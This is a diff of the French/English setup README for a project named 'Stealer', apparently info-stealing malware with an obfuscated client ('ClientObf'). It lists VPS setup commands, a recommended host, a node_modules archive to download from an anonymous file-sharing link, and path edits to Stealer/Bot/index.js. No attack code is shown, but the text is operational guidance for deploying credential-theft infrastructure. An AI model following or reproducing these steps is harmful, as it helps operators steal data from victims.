@@ -6,7 +6,7 @@ Please tag the github if you use it i need star :c
 
 french
 
-Use Vps with Ubuntu 20.04 (i prefer https://rdp.sh/ 10$ server per month in amsterdam)
+Utilise un Vps avec Ubuntu 20.04 (je préfère https://rdp.sh/ c'est 10$ par mois et en plus c'est proche c'est a Amsterdam)
 
 - sudo apt install zip
 - sudo apt install unzip
@@ -27,8 +27,8 @@ Setup the src on your vps
 - sudo npm i pm2 -g
 - sudo npm install -g pkg
 
-Unzip node_modules.zip in Stealer/bot
-Install https://anonfiles.com/5dwb0204z6/node_modules_zip and put him on ClientObf and unzip
+Unzip node_modules.zip dans Stealer/bot
+Install https://anonfiles.com/5dwb0204z6/node_modules_zip et place les dans ClientObf and unzip
 
 Changer vos directories dans Stealer/Bot/index.js et mettez les nouvelles (ex: /home/vshell/ClientObf/link.txt votre nom de vps est lolita, alors cela fera /home/lolita/ClientObf/link.txt si c'est root votre user alors cela sera /root/a/ClientObf/link.txt )
 
